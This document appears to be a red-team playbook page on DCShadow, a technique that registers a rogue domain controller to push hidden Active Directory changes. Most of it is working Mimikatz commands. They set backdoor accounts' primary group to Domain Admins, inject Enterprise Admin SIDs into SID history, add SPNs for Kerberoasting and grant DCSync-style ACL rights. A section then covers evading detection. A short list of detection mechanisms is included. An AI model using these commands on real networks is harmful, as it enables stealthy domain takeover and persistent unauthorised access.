# DCShadow for Persistence

> **MITRE ATT&CK**: Defense Evasion > T1207 - Rogue Domain Controller
> **Platforms**: Windows Active Directory
> **Required Privileges**: Domain Admin + SYSTEM on a domain controller
> **OPSEC Risk**: High (modifies AD replication, generates replication traffic)

---

## Strategic Overview

DCShadow is one of the most powerful Active Directory persistence techniques available. It works by temporarily registering a compromised machine as a domain controller, then using the AD replication protocol (DRS/DRSUAPI) to push arbitrary changes directly into the AD database. Unlike traditional AD modifications that are logged on the DC performing the change, DCShadow changes appear as legitimate replication events, making them extremely difficult to attribute. For a Red Team Lead, DCShadow represents the nuclear option for AD persistence: it can modify any AD attribute, inject SID history, add backdoor SPNs, alter ACLs, and create hidden administrative access -- all while bypassing most AD change monitoring solutions. The trade-off is the extremely high privilege requirement (Domain Admin + SYSTEM) and the risk that unusual replication traffic will alert defenders monitoring AD replication health.

## Technical Deep-Dive

### DCShadow Theory

```
Normal AD Modification Flow:
User -> DC (LDAP modify) -> Change logged in Security Event Log -> Replicates to other DCs

DCShadow Flow:
1. Attacker registers compromised machine as a DC (modifies AD schema)
2. Attacker pushes changes via DRS replication protocol
3. Legitimate DCs accept changes as normal replication
4. Changes are NOT logged as LDAP modifications
5. Attacker deregisters the rogue DC

Key insight: Replication-sourced changes bypass LDAP change auditing
```

### Prerequisites

```
Required:
- Domain Admin privileges (to register the rogue DC)
- SYSTEM privileges on the machine running DCShadow
- Network access to existing DCs (RPC/DRSUAPI)

Two Mimikatz instances needed:
1. SYSTEM context: Runs the "rogue DC" RPC server
2. Domain Admin context: Pushes changes and triggers replication
```

### Mimikatz DCShadow Commands

```bash
# === Terminal 1: Start rogue DC (requires SYSTEM) ===
# Run Mimikatz as SYSTEM (e.g., via PsExec -s)
mimikatz # lsadump::dcshadow /object:"CN=TargetUser,CN=Users,DC=corp,DC=local" /attribute:description /value:"Backdoored"

# === Terminal 2: Push replication (requires Domain Admin) ===
mimikatz # lsadump::dcshadow /push

# The change is replicated to all DCs as if it came from a legitimate DC
```

### Modifying Arbitrary AD Attributes

```bash
# Change user's description (proof of concept)
mimikatz # lsadump::dcshadow /object:"CN=John Smith,CN=Users,DC=corp,DC=local" /attribute:description /value:"Modified via DCShadow"

# Modify user's primary group ID (add to Domain Admins)
mimikatz # lsadump::dcshadow /object:"CN=BackdoorUser,CN=Users,DC=corp,DC=local" /attribute:primaryGroupID /value:512

# Modify userAccountControl (disable account, enable, etc.)
mimikatz # lsadump::dcshadow /object:"CN=BackdoorUser,CN=Users,DC=corp,DC=local" /attribute:userAccountControl /value:512

# Set password never expires
mimikatz # lsadump::dcshadow /object:"CN=BackdoorUser,CN=Users,DC=corp,DC=local" /attribute:userAccountControl /value:66048
```

### Adding Backdoor SPNs

```bash
# Add SPN to a user account (enables Kerberoasting for that account)
# Useful for adding SPNs to high-privilege accounts for later credential extraction
mimikatz # lsadump::dcshadow /object:"CN=AdminUser,CN=Users,DC=corp,DC=local" /attribute:servicePrincipalName /value:"http/backdoor.corp.local"

# After pushing, you can Kerberoast this account:
# Rubeus.exe kerberoast /user:AdminUser
```

### SID History Injection

```bash
# Inject Enterprise Admin SID into a regular user's SID history
# This gives the user Enterprise Admin privileges without being in the group
mimikatz # lsadump::dcshadow /object:"CN=NormalUser,CN=Users,DC=corp,DC=local" /attribute:sIDHistory /value:S-1-5-21-<domain>-519

# Inject Domain Admin SID
mimikatz # lsadump::dcshadow /object:"CN=NormalUser,CN=Users,DC=corp,DC=local" /attribute:sIDHistory /value:S-1-5-21-<domain>-512

# The user now has DA/EA privileges but does not appear in any privileged groups
# Most auditing tools check group membership, not SID history
```

### Modifying ACLs via DCShadow

```bash
# Modify the ntSecurityDescriptor attribute to add backdoor ACEs
# Grant a user DCSync rights (Replicating Directory Changes)
# This requires crafting the proper SDDL or binary security descriptor

mimikatz # lsadump::dcshadow /object:"DC=corp,DC=local" /attribute:ntSecurityDescriptor /value:<modified_SD_with_backdoor_ACE>

# Grant GenericAll on the domain object to a backdoor account
# This provides full control over the domain without group membership
```

### DCShadow vs DCSync Comparison

```
Feature              | DCSync                    | DCShadow
---------------------|---------------------------|---------------------------
Direction            | PULL (read data from DC)  | PUSH (write data to DC)
Purpose              | Extract credentials       | Modify AD objects
Privileges needed    | Replicating Dir Changes   | Domain Admin + SYSTEM
Detection            | Event ID 4662 on DC       | Replication monitoring
Persistence value    | Extract KRBTGT hash       | Modify any AD attribute
Stealth              | Medium (logged on DC)     | High (replication event)
Risk                 | Medium                    | High (AD corruption risk)
```

### Automated DCShadow Operations

```powershell
# PowerShell wrapper for common DCShadow operations

# Add user to privileged group via primaryGroupID
function Invoke-DCShadowGroupAdd {
    param($TargetUser, $GroupRID)  # 512=DA, 519=EA, 518=Schema Admins
    # Terminal 1 (SYSTEM): lsadump::dcshadow /object:$TargetUser /attribute:primaryGroupID /value:$GroupRID
    # Terminal 2 (DA): lsadump::dcshadow /push
}

# Backdoor account with SIDHistory
function Invoke-DCShadowSIDHistory {
    param($TargetUser, $PrivilegedSID)
    # lsadump::dcshadow /object:$TargetUser /attribute:sIDHistory /value:$PrivilegedSID
}
```

## Detection & Evasion

### Detection Mechanisms
- **New DC registration**: Monitor for new nTDSDSA objects in AD
- **Replication source monitoring**: Unexpected replication partners in DcDiag output
- **Event ID 4742**: Computer account modified (DC registration changes computer attributes)
- **Network monitoring**: DRS/DRSUAPI traffic from non-DC machines
- **AD object change monitoring**: Changes without corresponding LDAP event IDs
- **SPN monitoring**: New SPNs on the machine account during DC registration

### Evasion Techniques
- Execute during periods of legitimate AD replication activity
- Use short DCShadow windows (register, push, deregister quickly)
- Target attributes that are not commonly monitored (description, extensionAttributes)
- DCShadow changes bypass LDAP modification auditing -- this is inherent to the technique
- Use a machine that is already a DC candidate or has DC-like SPNs

### OPSEC Considerations
- DCShadow temporarily modifies AD schema -- this is visible in AD replication metadata
- The rogue DC registration creates SPN changes on the machine account
- If DCShadow fails mid-operation, the rogue DC registration may persist
- AD corruption is possible if attribute modifications are invalid
- Deregistration cleanup is critical -- verify the machine is removed as a DC
- This technique should only be used when the engagement scope explicitly permits AD modification

## Cross-References

- `04-persistence/golden-ticket-persistence.md` - Golden/Diamond ticket persistence
- `04-persistence/skeleton-key.md` - Skeleton Key persistence
- `12-active-directory-deep-dive/ad-persistence-deep-dive.md` - Comprehensive AD persistence
- `07-credential-access/` - DCSync for credential extraction

## References

- DCShadow original research (Delpy & Le Toux): https://www.dcshadow.com/
- MITRE T1207: https://attack.mitre.org/techniques/T1207/
- Mimikatz DCShadow: https://github.com/gentilkiwi/mimikatz
- DCShadow detection (Microsoft): https://docs.microsoft.com/en-us/advanced-threat-analytics/suspicious-activity-guide
- DCShadow explained (Alsid): https://alsid.com/company/news/dcshadow-explained
